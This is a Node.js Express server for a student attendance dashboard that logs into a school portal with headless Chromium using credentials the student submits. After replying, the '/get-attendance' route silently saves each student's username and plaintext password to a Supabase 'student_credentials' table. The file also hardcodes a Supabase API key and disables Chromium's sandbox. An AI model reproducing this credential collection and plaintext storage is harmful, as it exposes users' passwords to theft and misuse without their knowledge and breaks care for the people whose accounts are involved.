// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const puppeteer = require('puppeteer-core');
const chromium = require('chromium');
const { login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");

const app = express();
app.use(cors({ origin: "https://attendancedashboar.vercel.app" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const supabaseUrl = "https://ywsqpuvraddaimlbiuds.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3c3FwdXZyYWRkYWltbGJpdWRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MjMzMDgsImV4cCI6MjA3NjM5OTMwOH0.UqkzzWM7nRvgtNdvRy63LLN-UGv-zeYYx6tRYD5zxdY";
const supabase = createClient(supabaseUrl, supabaseKey);

let browser;

// --- Launch persistent Chromium ---
(async () => {
  browser = await puppeteer.launch({
    headless: true,
    executablePath: chromium.path,
    args: ["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage"]
  });
  console.log("Persistent Chromium launched ✅");
})();

// --- Helper: run in incognito ---
async function runInIncognito(fn) {
  const context = await browser.createIncognitoBrowserContext();
  const page = await context.newPage();
  try {
    return await fn(page);
  } finally {
    await page.close();
    await context.close();
  }
}

// --- Attendance Route ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  try {
    const result = await runInIncognito(async (page) => {
      await login(page, username, password);

      const academicWithTargets = await fetchAcademic(page);
      const biometricAttendance = await fetchBiometric(page);

      return { academicWithTargets, biometricAttendance };
    });

    // Send combined response
    res.json({ success: true, ...result });

    const now = new Date().toISOString();
    await supabase.from("student_credentials").upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
    await supabase.from("site_visits").insert([{ username, visited_at: now }]);

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// --- Today login count ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date(); startOfDay.setHours(0,0,0,0);
    const endOfDay = new Date(); endOfDay.setHours(23,59,59,999);

    const { count, error } = await supabase
      .from("site_visits")
      .select("id", { count: "exact", head: true })
      .gte("visited_at", startOfDay.toISOString())
      .lte("visited_at", endOfDay.toISOString());

    if (error) throw error;
    res.json({ today_logins: count });
  } catch (err) {
    console.error(err);
    res.status(500).json({ today_logins: 0 });
  }
});

app.listen(process.env.PORT || 3000, () => console.log("Server running ✅"));
